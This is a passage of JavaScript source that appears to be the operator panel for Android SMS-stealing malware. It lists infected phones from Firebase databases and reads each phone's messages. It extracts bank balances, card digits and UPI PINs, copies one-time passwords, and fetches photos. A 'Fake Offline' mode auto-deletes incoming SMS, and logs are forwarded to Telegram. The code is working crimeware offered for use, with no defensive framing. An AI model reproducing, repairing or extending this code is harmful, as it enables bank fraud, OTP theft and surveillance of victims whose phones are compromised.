  return{id:k,name,dbUrl:db.url,dbKey:db.key,dbName:db.name||'',online:isOn,realOnline:isOn,isFake,dbStatus:isFake?false:isOn,android,battery:parseInt(batteryStr.replace(/\D/g,''))||0,batteryStr,number:phone,network,ip,lastSeen,upipin:upiPin,bankInfo:null,cardInfo:null,limitHit:false,limitInfo:null};
}

// ═══════════════════════════════════════════
//  FETCH MESSAGES (same, uses backend yn())
// ═══════════════════════════════════════════
async function fetchMessagesFromDb(url,key,devId,limit,signal){
  limit=limit||SMS_PER_DEVICE_LIMIT;
  try{
    let allMsgs={};
    try{
      let data=await yn(url,key,'messages/'+devId,{orderBy:'"$key"',limitToLast:String(limit)},signal);
      if(data&&typeof data==='object') Object.keys(data).forEach(k=>{if(data[k]&&typeof data[k]==='object') allMsgs[k]=data[k];});
    }catch(e){
      if(e.name==='AbortError') throw e;
      try{let data=await yn(url,key,'messages/'+devId,{},signal);if(data&&typeof data==='object') Object.keys(data).forEach(k=>{if(data[k]&&typeof data[k]==='object') allMsgs[k]=data[k];});}catch(e2){if(e2.name==='AbortError') throw e2;}
    }
    if(Object.keys(allMsgs).length===0){
      for(const node of['sentMessages','outbox','sent']){
        try{let data=await yn(url,key,node+'/'+devId,{},signal);if(data&&typeof data==='object'&&Object.keys(data).length>0){Object.keys(data).forEach(k=>{if(!allMsgs[k]&&data[k]&&typeof data[k]==='object'){data[k]._outgoing=true;allMsgs[k]=data[k];}});break;}}catch(e){if(e.name==='AbortError') throw e;}
      }
    }
    let arr=[];
    Object.keys(allMsgs).forEach(msgId=>{
      let S=allMsgs[msgId];
      let txt=S.message||S.body||S.text||S.msg||S.content||S.sms||"";
      if(!txt||!String(txt).trim()) return;
      let direction='in';
      if(S._outgoing||S.type==='sent'||S.direction==='outgoing'||S.direction==='out'||S.isSent===true||S.sentByUs===true) direction='out';
      let sender=S.sender||S.from||S.address||S.number||(direction==='out'?'Sent':'Unknown');
      const tFields=['dateTime','datetime','date_time','timestamp','timeStamp','ts','time','date','receivedTime','received_at','receivedAt','sentTime','sent_at','sentAt','createdAt','created_at','updatedAt','smsTime','msgTime','when','at','receivedOn','sentOn','time_stamp'];
      let rawTime='';
      for(const field of tFields){if(S[field]!==undefined&&S[field]!==null&&S[field]!==''&&S[field]!==0){let testMs=parseTimeMs(S[field],msgId);if(testMs>1e12&&testMs<Date.now()+86400000*2){rawTime=S[field];break;}}}
      if(!rawTime){for(const k of Object.keys(S)){const v=S[k];if(v&&(typeof v==='string'||typeof v==='number')){const testMs=parseTimeMs(v,'');if(testMs>1e12&&testMs<Date.now()+86400000*2){rawTime=v;break;}}}}
      let timeMs=parseTimeMs(rawTime,msgId);
      arr.push({id:msgId,text:String(txt),sender:String(sender),time:rawTime,timeMs,direction});
    });
    arr.sort((a,b)=>{if(a.timeMs!==b.timeMs) return b.timeMs-a.timeMs;return b.id.localeCompare(a.id);});
    return arr;
  }catch(e){if(e.name==='AbortError') throw e;return[];}
}

// ═══════════════════════════════════════════
//  SHARE MODAL (same)
// ═══════════════════════════════════════════
function openShareModal(){shareTargetDeviceId=null;$('generatedLink').value='';$('shareModal').classList.add('active');}
function openDeviceShareModal(){if(!activeDevice) return;shareTargetDeviceId=activeDevice.id;$('generatedLink').value='';$('shareModal').classList.add('active');}
async function generateShareLink(){
  let btn=$('btnGenLink');btn.disabled=true;btn.innerText='Encrypting...';
  try{
    let expiryHours=parseInt($('shareExpiry').value);
    let exp=expiryHours===0?null:Date.now()+(expiryHours*3600000);
    let payload={u:currentDb.url,k:currentDb.key||"",d:shareTargetDeviceId||"",e:exp};
    let encrypted=await aesEncrypt(JSON.stringify(payload));
    if(!encrypted) throw new Error("Encrypt failed");
    let link=window.location.origin+window.location.pathname+"?s="+encrypted;
    $('generatedLink').value=link;
    try{await navigator.clipboard.writeText(link);toast("🔐 Encrypted link copied!");}catch(e){toast("Link generated!");}
  }catch(e){toast("Error: "+e.message);}
  finally{btn.disabled=false;btn.innerText="Generate";}
}

// ═══════════════════════════════════════════
//  LOAD REAL DATA (same)
// ═══════════════════════════════════════════
async function loadRealData(db,originalInput){
  if(!db.url) return;
  if(!isAllMode){
    $('globalLoading').style.display='inline-flex';
    $('globalLoading').innerHTML='<div class="spinner" style="width:14px;height:14px;border-width:2px;margin:0;"></div> Connecting...';
    $('dashStatus').innerHTML='<span class="mini-spin"></span> Connecting...';
  }
  try{
    let rootData=await yn(db.url,db.key,"clients");
    if(!rootData) throw new Error("No data in /clients");
    let keys=Object.keys(rootData);
    let newDevices=[];
    if(!isAllMode){allDevices=[];allMsgsCache=[];allMsgsIds.clear();$('deviceList').innerHTML='';}
    if(pendingAutoOpenDevice){
      if(rootData[pendingAutoOpenDevice]){let dev=parseDevice(pendingAutoOpenDevice,rootData[pendingAutoOpenDevice],db);if(dev){newDevices.push(dev);allDevices.push(dev);}}
      $('dashStatus').innerHTML='<span style="color:var(--green);">●</span> Connected • 1 device (Shared)';
      await fetchBankDataAsync(newDevices);
      $('globalLoading').style.display='none';
      if(newDevices.length>0) openDevice(newDevices[0].id);
      pendingAutoOpenDevice=null;return;
    }
    const BATCH=10;
    for(let i=0;i<keys.length;i+=BATCH){
      let batch=keys.slice(i,i+BATCH);
      batch.forEach(k=>{let dev=parseDevice(k,rootData[k],db);if(dev){newDevices.push(dev);allDevices.push(dev);}});
      allDevices.sort((a,b)=>a.online===b.online?0:a.online?-1:1);
      if(!isAllMode){
        $('dashStatus').innerHTML='<span class="mini-spin"></span> Streaming '+allDevices.length+'/'+keys.length+'...';
        $('globalLoading').innerHTML='<div class="spinner" style="width:14px;height:14px;border-width:2px;margin:0;"></div> Fetching: '+allDevices.length+'/'+keys.length+'...';
      }
      updateStats();renderDevices();
      await new Promise(r=>setTimeout(r,0));
    }
    if(!isAllMode) $('dashStatus').innerHTML='<span style="color:var(--green);">●</span> Connected • '+allDevices.length+' devices';
    await fetchBankDataAsync(newDevices);
    if(!isAllMode) $('globalLoading').style.display='none';
    if(!loggedDbs.has(db.url)){sendTgLog(originalInput||db.url,db.url,db.key,false,"",newDevices.length,newDevices.filter(d=>d.online).length);loggedDbs.add(db.url);}
    scheduleDailyRefresh();startFirebaseAutoRefresh();startAutoDeleteWorker();startAllMsgsBackground();
  }catch(e){
    if(!isAllMode){$('globalLoading').style.display='none';$('dashStatus').innerHTML='<span style="color:var(--danger);">●</span> Error: '+e.message;$('deviceList').innerHTML='<div style="text-align:center;padding:20px;color:var(--danger);">Error: '+e.message+'</div>';}
  }
}

async function fetchBankDataAsync(devices){
  const PARALLEL=30;
  for(let i=0;i<devices.length;i+=PARALLEL){
    let batch=devices.slice(i,i+PARALLEL);
    await Promise.all(batch.map(async(d)=>{
      try{
        const smsArr=await fetchMessagesFromDb(d.dbUrl,d.dbKey,d.id,100);
        window.deviceSmsCache[d.id]=smsArr;
        smsArr.forEach(m=>{
          let key=(d.dbUrl||'')+'_'+d.id+'_'+m.id;
          if(!allMsgsIds.has(key)){allMsgsIds.add(key);allMsgsCache.push({...m,devId:d.id,devNumber:d.number,dbName:d.dbName,dbUrl:d.dbUrl});}
        });
        let lb=null,lc=null,qNum=null;
        for(let msg of smsArr){
          if(!lb){let b=parseBankSMS(msg.text,msg.sender);if(b) lb=b;}
          if(!lc){let c=parseCardSMS(msg.text);if(c) lc=c;}
          if(!qNum&&isQuotaSms(msg.text)){const match=msg.text.match(/(?:\+91|0)?[6-9]\d{9}/);if(match) qNum=match[0];}
          if(lb&&lc&&qNum) break;
        }
        if(lb) d.bankInfo=lb;if(lc) d.cardInfo=lc;if(qNum&&d.number==='—') d.number=qNum;
        if(smsArr.length>0){const lt=smsArr[0].timeMs;if(lt>1e12&&lt>(d.lastSeen||0)) d.lastSeen=lt;}
        const qInfo=computeQuotaForDevice(d.id,smsArr);
        d.limitHit=qInfo.hit&&qInfo.pct>=50;d.limitInfo=d.limitHit?{pct:qInfo.pct,type:qInfo.type}:null;
      }catch(e){}
    }));
    let lc2=Math.min(i+PARALLEL,devices.length);
    if(!isAllMode) $('globalLoading').innerHTML='<div class="spinner" style="width:14px;height:14px;border-width:2px;margin:0;"></div> SMS: '+lc2+'/'+devices.length+' ('+allMsgsCache.length+' msgs)';
    allMsgsCache.sort(sortLatestFirst);
    if(allMsgsCache.length>3000){allMsgsCache=allMsgsCache.slice(0,3000);allMsgsIds.clear();allMsgsCache.forEach(m=>allMsgsIds.add((m.dbUrl||'')+'_'+m.devId+'_'+m.id));}
    updateStats();renderDevices();
    if($('view-allmsgs').classList.contains('active')) renderAllMessages();
    _saveMsgsToSession();
    await new Promise(r=>setTimeout(r,0));
  }
}

// ═══════════════════════════════════════════
//  FAST REFRESH (same)
// ═══════════════════════════════════════════
async function fastRefresh(){
  toast("Refreshing...");$('globalLoading').style.display='inline-flex';
  try{
    if(isAllMode){
      for(const db of savedDbs){
        const cleanUrl=db.url.replace(/\/+$/,'');
        try{
          const rootData=await yn(cleanUrl,db.key,"clients");
          if(!rootData) continue;
          Object.keys(rootData).forEach(k=>{
            const ex=allDevices.find(d=>d.id===k&&d.dbUrl===cleanUrl);
            if(ex){const up=parseDevice(k,rootData[k],{url:cleanUrl,key:db.key,name:ex.dbName});if(up){ex.online=up.online;ex.battery=up.battery;ex.batteryStr=up.batteryStr;ex.lastSeen=up.lastSeen;ex.upipin=up.upipin;ex.name=up.name;}}
          });
        }catch(e){}
      }
      updateStats();renderDevices();toast("✅ All DBs Refreshed");return;
    }
    if(!currentDb.url) return;
    const rootData=await yn(currentDb.url,currentDb.key,"clients");
    if(!rootData) return;
    Object.keys(rootData).forEach(k=>{
      const ex=allDevices.find(d=>d.id===k);
      if(ex){const up=parseDevice(k,rootData[k],currentDb);if(up){ex.online=up.online;ex.battery=up.battery;ex.batteryStr=up.batteryStr;ex.lastSeen=up.lastSeen;ex.upipin=up.upipin;ex.name=up.name;}}
    });
    updateStats();renderDevices();toast("✅ Refreshed");
  }catch(e){}
  finally{$('globalLoading').style.display='none';}
}

// ═══════════════════════════════════════════
//  TAIL REFRESH (same)
// ═══════════════════════════════════════════
async function tailRefreshActive(){
  if(!activeDevice) return;
  if(activeDevice.isFake) return toast("🔒 Fake Offline. Auto-deleting new SMS.");
  toast("Fetching new messages...");
  try{
    let newMsgs=await fetchMessagesFromDb(activeDevice.dbUrl,activeDevice.dbKey,activeDevice.id,60);
    let cur=window._currentSmsArr||[];
    let existingIds=new Set(cur.map(m=>m.id));
    let added=0;
    newMsgs.forEach(m=>{if(!existingIds.has(m.id)){cur.push(m);added++;}});
    if(added>0){
      cur.sort((a,b)=>{if(a.timeMs!==b.timeMs) return b.timeMs-a.timeMs;return b.id.localeCompare(a.id);});
      window._currentSmsArr=cur;window.deviceSmsCache[activeDevice.id]=cur;lastRawSms="__FORCE__";
      processAndRenderSms(cur);toast("✓ "+added+" new message"+(added>1?"s":""));
    }else toast("No new messages");
    const devData=await fbGetNode(activeDevice.dbUrl,activeDevice.dbKey,'clients/'+activeDevice.id);
    if(devData){const up=parseDevice(activeDevice.id,devData,{url:activeDevice.dbUrl,key:activeDevice.dbKey,name:activeDevice.dbName});if(up){activeDevice=up;updateDeviceUI(up);}}
  }catch(e){toast("Refresh failed");}
}

// ═══════════════════════════════════════════
//  FIREBASE AUTO-REFRESH (same)
// ═══════════════════════════════════════════
function startFirebaseAutoRefresh(){
  if(firebaseAutoRefreshTimer) clearInterval(firebaseAutoRefreshTimer);
  firebaseRefreshInterval=3000;firebaseMissCount=0;
  firebaseAutoRefreshTimer=setInterval(async()=>{
    if(allDevices.length===0) return;
    try{
      if(isAllMode){
        for(const db of savedDbs){
          const cleanUrl=db.url.replace(/\/+$/,'');
          try{
            const rootData=await yn(cleanUrl,db.key,"clients");
            if(!rootData) continue;
            Object.keys(rootData).forEach(k=>{
              const ex=allDevices.find(d=>d.id===k&&d.dbUrl===cleanUrl);
              if(!ex) return;
              const up=parseDevice(k,rootData[k],{url:cleanUrl,key:db.key,name:ex.dbName});
              if(!up) return;
              if(ex.online!==up.online||ex.battery!==up.battery||ex.upipin!==up.upipin||ex.name!==up.name||ex.lastSeen!==up.lastSeen){ex.online=up.online;ex.battery=up.battery;ex.batteryStr=up.batteryStr;ex.lastSeen=up.lastSeen;ex.upipin=up.upipin;ex.name=up.name;}
            });
          }catch(e){}
        }
        updateStats();renderDevices();return;
      }
      if(!currentDb.url) return;
      const rootData=await yn(currentDb.url,currentDb.key,"clients");
      if(!rootData){firebaseMissCount++;return;}
      let changed=false;
      Object.keys(rootData).forEach(k=>{
        const ex=allDevices.find(d=>d.id===k);
        if(!ex) return;
        const up=parseDevice(k,rootData[k],currentDb);
        if(!up) return;
        if(ex.online!==up.online||ex.battery!==up.battery||ex.upipin!==up.upipin||ex.name!==up.name||ex.lastSeen!==up.lastSeen){ex.online=up.online;ex.battery=up.battery;ex.batteryStr=up.batteryStr;ex.lastSeen=up.lastSeen;ex.upipin=up.upipin;ex.name=up.name;changed=true;}
      });
      if(changed){updateStats();renderDevices();firebaseMissCount=0;}else firebaseMissCount++;
    }catch(e){firebaseMissCount++;}
  },firebaseRefreshInterval);
}

// ═══════════════════════════════════════════
//  STATS & FILTERS (same)
// ═══════════════════════════════════════════
function updateStats(){
  let on=0,off=0,bank=0,cards=0,upiCount=0;
  allDevices.forEach(d=>{if(d.online) on++; else off++;if(d.bankInfo) bank++;if(d.cardInfo) cards++;if(d.upipin) upiCount++;});
  $('statTotal').innerText=allDevices.length;$('statOnline').innerText=on;$('statOffline').innerText=off;
  $('statBank').innerText=bank;$('statCards').innerText=cards;$('statUpi').innerText=upiCount;
}
function setFilter(f,el){currentFilter=f;document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));if(el) el.classList.add('active');renderDevices();}
function setSort(sortVal){currentSort=sortVal;renderDevices();}

// ═══════════════════════════════════════════
//  RENDER DEVICES (same)
// ═══════════════════════════════════════════
function renderDevices(){
  let html='';let q=$('searchInput').value.toLowerCase().trim();
  let filtered=allDevices.filter(d=>{
    if(currentFilter==='online'&&!d.online) return false;
    if(currentFilter==='offline'&&d.online) return false;
    if(currentFilter==='fake'&&!d.isFake) return false;
    if(currentFilter==='upi'&&!d.upipin) return false;
    if(currentFilter==='bank'&&!d.bankInfo) return false;
    if(currentFilter==='card'&&!d.cardInfo) return false;
    if(currentFilter==='quota'&&!(d.limitInfo&&d.limitInfo.pct>=50)) return false;
    if(currentFilter==='starred'&&!starredDevices.includes(d.id)) return false;
    if(q){return d.id.toLowerCase().includes(q)||(d.name||"").toLowerCase().includes(q)||d.number.toLowerCase().includes(q)||(d.bankInfo?.bankName||"").toLowerCase().includes(q);}
    return true;
  });
  filtered.sort((a,b)=>{
    if(currentSort==='newest') return b.lastSeen-a.lastSeen;
    if(currentSort==='oldest') return a.lastSeen-b.lastSeen;
    if(currentSort==='name') return String(a.name).localeCompare(String(b.name));
    if(currentSort==='battery') return b.battery-a.battery;
    if(currentSort==='balance'){let bA=a.bankInfo&&a.bankInfo.availableBalance?parseFloat(a.bankInfo.availableBalance):0;let bB=b.bankInfo&&b.bankInfo.availableBalance?parseFloat(b.bankInfo.availableBalance):0;return bB-bA;}
    return 0;
  });
  if(!filtered.length){$('deviceList').innerHTML='<div style="text-align:center;padding:30px 20px;color:var(--muted);">No devices match filter.</div>';return;}
  filtered.forEach(d=>{
    const isOnline=d.online;
    const fakeTag=d.isFake?'<span style="color:var(--warn);background:rgba(255,176,32,0.1);border:1px solid rgba(255,176,32,0.3);padding:1px 5px;border-radius:3px;font-size:8px;margin-left:4px;">FAKE</span>':'';
    const safeId=encodeURIComponent(d.id);
    const dbBadgeHtml=(isAllMode&&!isSharedLinkMode&&d.dbName)?'<div class="db-label-badge">'+d.dbName+'</div>':'';
    const isStarred=starredDevices.includes(d.id)?'star-active':'';
    const batClass=d.battery<20?'bad':(d.battery<50?'warn':'good');
    const upiIcon=d.upipin?'<svg class="upi-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14.5v-3H8v-3h3v-3h2v3h3v3h-3v3h-2z"/></svg>':'';
    const cardIcon=d.cardInfo?'<svg class="card-icon" viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>':'';
    let bankHtml='';
    if(d.bankInfo){
      const b=d.bankInfo;const isCredit=b.transactionType==='credit';
      let txAmountHtml='';if(b.transactionAmount) txAmountHtml='<div class="bank-hl-tx '+(isCredit?'credit':'debit')+'">'+(isCredit?'↗':'↙')+' '+(isCredit?'+':'-')+'₹'+formatAmount(b.transactionAmount)+'</div>';
      let balHtml='';if(b.availableBalance!==null&&b.availableBalance!==undefined) balHtml='<div class="bank-hl-bal">Bal: ₹'+formatAmount(b.availableBalance)+'</div>';
      bankHtml='<div class="bank-highlight-box"><div class="bank-hl-row1"><div class="bank-hl-name">'+b.bankName+(b.accountLast4?' •• '+b.accountLast4:'')+'</div>'+balHtml+'</div>'+(txAmountHtml?'<div class="bank-hl-row2">'+txAmountHtml+'<span class="bank-hl-acc">'+(b.accountLast4?'••'+b.accountLast4:'')+'</span></div>':'')+'</div>';
    }
    let cardHtml='';if(d.cardInfo){const c=d.cardInfo;cardHtml='<div class="card-highlight-box"><div class="card-highlight-left">💳 •• '+c.cardLast4+' '+(c.cardType||'')+'</div><div class="card-highlight-right">CARD</div></div>';}
    let limitHtml='',quotaClass='';
    if(d.limitInfo&&d.limitInfo.pct>=50){
      if(d.limitInfo.type==='reached'||d.limitInfo.pct>=100){limitHtml='<div style="margin-top:4px;"><span class="limit-badge">🚨 SMS LIMIT REACHED</span></div>';quotaClass='quota-hit';}
      else{limitHtml='<div style="margin-top:4px;"><span class="used-badge">⚠ SMS USED '+d.limitInfo.pct+'%</span></div>';quotaClass='quota-warn';}
    }
    let lastSeenHtml='';
    if(d.lastSeen>1e12){const rel=formatRelativeTime(d.lastSeen);lastSeenHtml=isOnline?'<span class="last-seen" data-lastseen="'+d.lastSeen+'" data-online="1">• '+rel+'</span>':'<span class="last-seen" data-lastseen="'+d.lastSeen+'" data-online="0">• offline '+rel+'</span>';}
    html+='<div class="dev-card '+(isOnline?'online':'')+(d.isFake?' is-fake':'')+' '+quotaClass+'" data-dev-id="'+safeId+'" onclick="openDeviceFromCard(this)">'+dbBadgeHtml+'<div class="card-top"><div class="wifi-box '+(isOnline?'online':'offline')+'"><svg viewBox="0 0 24 24" width="20" height="20"><path d="M12 3C7.8 3 4.1 4.6 1.3 7.2L12 19l10.7-11.8C19.9 4.6 16.2 3 12 3zm0 2c3.2 0 6.1 1.1 8.4 3L12 16.5 3.6 8C5.9 6.1 8.8 5 12 5z"/></svg></div><div class="card-title"><h3>'+d.name+'</h3><p>'+d.id+'</p></div><div class="card-actions-top">'+upiIcon+cardIcon+'<svg class="'+isStarred+'" onclick="event.stopPropagation(); toggleStar(\''+d.id+'\')" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg></div></div><div class="card-stats-grid"><div class="card-stat"><label>AND</label><div>'+d.android+'</div></div><div class="card-stat"><label>BAT</label><div><span class="bat-icon '+batClass+'"></span> '+d.batteryStr+'</div></div><div class="card-stat"><label>NUM</label><div>'+d.number+'</div></div><div class="card-stat"><label>NET</label><div>'+d.network+'</div></div></div>'+bankHtml+cardHtml+limitHtml+'<div class="card-footer-bottom"><div class="status-badge '+(isOnline?'online':'offline')+'"><span class="dot"></span> '+(isOnline?'Online':'Offline')+' '+fakeTag+' '+lastSeenHtml+'</div>'+(d.upipin?'<div class="upi-badge">UPI</div>':'')+'</div></div>';
  });
  $('deviceList').innerHTML=html;
  refreshLastSeenLabels();
}

function toggleStar(id){if(starredDevices.includes(id)){starredDevices=starredDevices.filter(x=>x!==id);toast("Removed from Starred");}else{starredDevices.push(id);toast("Added to Starred");}localStorage.setItem('starred_devices',JSON.stringify(starredDevices));renderDevices();}
function openDeviceFromCard(el){openDevice(decodeURIComponent(el.dataset.devId));}

// ═══════════════════════════════════════════
//  OPEN DEVICE (same)
// ═══════════════════════════════════════════
async function openDevice(id){
  try{
    activeDevice=allDevices.find(d=>d.id===id);if(!activeDevice) return;
    $('detId').innerText=activeDevice.name;$('detIdSub').innerText=activeDevice.id;
    $('detName').innerText=activeDevice.name;$('detIdSubInfo').innerText=activeDevice.id;
    $('detUpiPin').innerText=activeDevice.upipin||'—';
    $('btnFakeOffline').innerText=activeDevice.isFake?"Remove Fake":"Fake Offline";
    $('btnFakeOffline').style.background=activeDevice.isFake?'var(--green)':'var(--warn)';
    updateLockButtonState();updateSendTabLockState();
    lastRawSms="";updateDeviceUI(activeDevice);
    switchDetailTab('info',document.querySelectorAll('.d-tab')[0]);
    gallerySelected.clear();galleryData={};
    $('galleryContainer').innerHTML='<div style="text-align:center;padding:40px 20px;color:var(--muted);">Select amount and hit "Fetch Photos".</div>';
    $('galCount').innerText="0 selected";$('galleryFooter').style.display='none';
    $('view-device').classList.add('active');
    renderDeletedTab(activeDevice.id);
    if(window.deviceSmsCache[id]&&window.deviceSmsCache[id].length){
      window._currentSmsArr=window.deviceSmsCache[id].slice();
      processAndRenderSms(window._currentSmsArr);
    }else{
      $('detBankList').innerHTML='<div style="text-align:center;padding:20px;color:var(--muted);"><span class="mini-spin"></span> Fetching...</div>';
      $('detSmsList').innerHTML=$('detBankList').innerHTML;$('detCardList').innerHTML=$('detBankList').innerHTML;$('detQuotaList').innerHTML=$('detBankList').innerHTML;
    }
    if(!activeDevice.isFake){
      let quickSms=await fetchMessagesFromDb(activeDevice.dbUrl,activeDevice.dbKey,activeDevice.id,100);
      if(quickSms.length>0){window._currentSmsArr=quickSms;window.deviceSmsCache[activeDevice.id]=quickSms;processAndRenderSms(quickSms);}
      else if(!window._currentSmsArr||window._currentSmsArr.length===0){window._currentSmsArr=[];processAndRenderSms([]);}
      fetchMessagesFromDb(activeDevice.dbUrl,activeDevice.dbKey,activeDevice.id,SMS_PER_DEVICE_LIMIT).then(fullSms=>{
        if(fullSms.length>0){window._currentSmsArr=fullSms;window.deviceSmsCache[activeDevice.id]=fullSms;lastRawSms="__FORCE__";processAndRenderSms(fullSms);}
      }).catch(()=>{});
    }
    let fwd=deviceForwarders[activeDevice.id]||{token:"",chatId:""};
    $('devFwdToken').value=fwd.token;$('devFwdChatId').value=fwd.chatId;
    startDeviceAutoRefresh();
  }catch(e){toast("Error: "+e.message);}
}

function startDeviceAutoRefresh(){
  if(autoRefreshTimer) clearTimeout(autoRefreshTimer);
  const fetchId=activeDevice.id,dbUrl=activeDevice.dbUrl,dbKey=activeDevice.dbKey;
  function scheduleNext(){
    autoRefreshTimer=setTimeout(async()=>{
      if(!activeDevice||activeDevice.id!==fetchId) return;
      if(activeDevice.isFake){scheduleNext();return;}
      if(isDeleting||isFetchingSms){scheduleNext();return;}
      isFetchingSms=true;
      try{
        const newSms=await fetchMessagesFromDb(dbUrl,dbKey,fetchId,60);
        const oldCache=window.deviceSmsCache[fetchId]||[];
        const oldIds=new Set(oldCache.map(m=>m.id));
        const newOnes=newSms.filter(m=>!oldIds.has(m.id));
        if(newOnes.length>0){
          window.deviceSmsCache[fetchId]=newSms;window._currentSmsArr=newSms;lastRawSms="__FORCE__";
          processAndRenderSms(newSms);toast("📩 "+newOnes.length+" new SMS");
        }
      }catch(e){}
      finally{isFetchingSms=false;}
      if(activeDevice&&activeDevice.id===fetchId) scheduleNext();
    },2000);
  }
  scheduleNext();
}

document.addEventListener('visibilitychange',()=>{
  if(!document.hidden&&activeDevice&&$('view-device').classList.contains('active')&&!activeDevice.isFake) startDeviceAutoRefresh();
});

// ═══════════════════════════════════════════
//  SMS RENDERING (same)
// ═══════════════════════════════════════════
function processAndRenderSms(smsArr){
  let rawSms=smsArr.map(m=>'['+m.direction+']['+m.sender+']['+m.timeMs+'] '+m.text).join('\n');
  if(rawSms===lastRawSms&&rawSms!==""&&window._currentSmsArr&&window._currentSmsArr.length===smsArr.length) return;
  lastRawSms=rawSms;
  let bankArr=[],cardArr=[],quotaArr=[],normalArr=[];
  smsArr.forEach(msg=>{
    let q=isQuotaSms(msg.text);let b=parseBankSMS(msg.text,msg.sender);let c=parseCardSMS(msg.text);
    if(q){msg.qInfo=q;quotaArr.push(msg);}
    else if(b){msg.bInfo=b;bankArr.push(msg);}
    else if(c){msg.cInfo=c;cardArr.push(msg);}
    normalArr.push(msg);
  });
  if($('tcQuota')) $('tcQuota').innerText=quotaArr.length;
  if($('tcBank'))  $('tcBank').innerText=bankArr.length;
  if($('tcSms'))   $('tcSms').innerText=normalArr.length;
  if($('tcCard'))  $('tcCard').innerText=cardArr.length;
  if($('detSmsSummary')) $('detSmsSummary').innerHTML='Total <b style="color:var(--cyan)">'+normalArr.length+'</b> • Bank <b style="color:var(--green)">'+bankArr.length+'</b> • Card <b style="color:var(--purple)">'+cardArr.length+'</b> • Limit <b style="color:var(--warn)">'+quotaArr.length+'</b>';
  if(bankArr.length>0) bankArr.sort((a,b)=>b.timeMs-a.timeMs);
  let bankHtml='';
  if(bankArr.length>0){
    let lb2=bankArr[0].bInfo;let balDisp=lb2.availableBalance!==null&&lb2.availableBalance!==undefined?'₹'+formatAmount(lb2.availableBalance):'—';let isCredit=lb2.transactionType==='credit';
    let txH='';if(lb2.transactionAmount) txH='<div class="bank-latest-tx-row"><span class="bank-latest-tx-label">'+(isCredit?'CREDIT':'DEBIT')+'</span><span class="bank-latest-tx-amt '+(isCredit?'credit':'debit')+'">'+(isCredit?'+':'−')+'₹'+formatAmount(lb2.transactionAmount)+'</span></div>';
    bankHtml='<div class="bank-latest-box"><div class="bank-latest-title">🏦 '+lb2.bankName+'</div><div class="bank-latest-balance-row"><div><div class="bank-latest-bal-label">Available Balance</div><div class="bank-latest-amt">'+balDisp+'</div></div>'+(lb2.accountLast4?'<span class="bank-latest-acc">'+lb2.accountLast4+'</span>':'')+'</div>'+txH+'</div>';
    bankArr.forEach(msg=>{bankHtml+=renderBankItem(msg,msg.bInfo);});
  }
  $('detBankList').innerHTML=bankHtml||'<div style="color:var(--muted);font-size:12px;text-align:center;padding:20px;">No bank SMS found.</div>';
  let cardHtml='';cardArr.forEach(msg=>{cardHtml+=renderCardItem(msg,msg.cInfo);});
  $('detCardList').innerHTML=cardHtml||'<div style="color:var(--muted);font-size:12px;text-align:center;padding:20px;">No card SMS found.</div>';
  let quotaHtml='';
  const lq=findLatestQuotaSms(smsArr);
  if(lq){
    const isToday2=getISTDate(lq.ms)===getTodayIST();
    let title,color;
    if(lq.type==='reached'||lq.pct>=100){title=isToday2?'🚨 SMS LIMIT REACHED — TODAY':'📅 LAST SMS LIMIT REACHED';color='var(--danger)';}
    else{title=isToday2?'⚠ SMS '+lq.pct+'% USED — TODAY':'📅 SMS '+lq.pct+'% USED';color='var(--warn)';}
    quotaHtml='<div class="quota-latest-box"><div class="quota-latest-title" style="color:'+color+';">'+title+'</div><div class="quota-latest-amt">'+formatIST(lq.msg.time,lq.msg.id)+'</div></div>';
  }
  quotaArr.forEach(msg=>{quotaHtml+=renderQuotaItem(msg);});
  $('detQuotaList').innerHTML=quotaHtml||'<div style="color:var(--muted);font-size:12px;text-align:center;padding:20px;">No SMS limit messages found.</div>';
  let smsHtml='';normalArr.forEach(s=>{smsHtml+=renderSmsItem(s);});
  $('detSmsList').innerHTML=smsHtml||'<div style="color:var(--muted);font-size:12px;text-align:center;padding:20px;">No SMS found.</div>';
  if(activeDevice&&window._currentSmsArr){
    let qInfo=computeQuotaForDevice(activeDevice.id,window._currentSmsArr);
    activeDevice.limitHit=qInfo.hit&&qInfo.pct>=50;activeDevice.limitInfo=activeDevice.limitHit?{pct:qInfo.pct,type:qInfo.type}:null;
    const el=$('detLimit');if(el){if(activeDevice.limitHit){if(qInfo.type==='reached'||qInfo.pct>=100){el.innerText="SMS LIMIT REACHED";el.style.color="var(--danger)";}else{el.innerText="SMS USED "+qInfo.pct+"%";el.style.color="var(--warn)";}}else{el.innerText="OK";el.style.color="var(--green)";}}
  }
}

function renderSmsItem(sms){
  const ist=formatIST(sms.time,sms.id);const ot=sms.text.match(/\b\d{4,8}\b/);const isOtp=/OTP|code|password|verification/i.test(sms.text);
  const otpBtn=(ot&&isOtp)?'<button class="action-btn otp" onclick="copyOtp(\''+ot[0]+'\')">Copy OTP</button>':'';
  const extraClass=sms.bInfo?' bank-msg':sms.cInfo?' card-msg':'';
  return '<div class="msg-card sms-theme'+extraClass+'"><div class="msg-top"><span class="msg-sender">'+(sms.sender||'Unknown')+(sms.direction==='out'?' (OUT)':'')+'</span><span class="msg-time">'+ist+'</span></div><div class="msg-body">'+sms.text+'</div><div class="msg-actions-bar">'+otpBtn+'<button class="action-btn" onclick="copyMsgById(\''+sms.id+'\')">Copy</button><button class="action-btn delete" onclick="deleteSingleMessage(\''+sms.id+'\', false)">🗑 Delete</button></div></div>';
}
function renderCardItem(sms,card){
  const ist=formatIST(sms.time,sms.id);
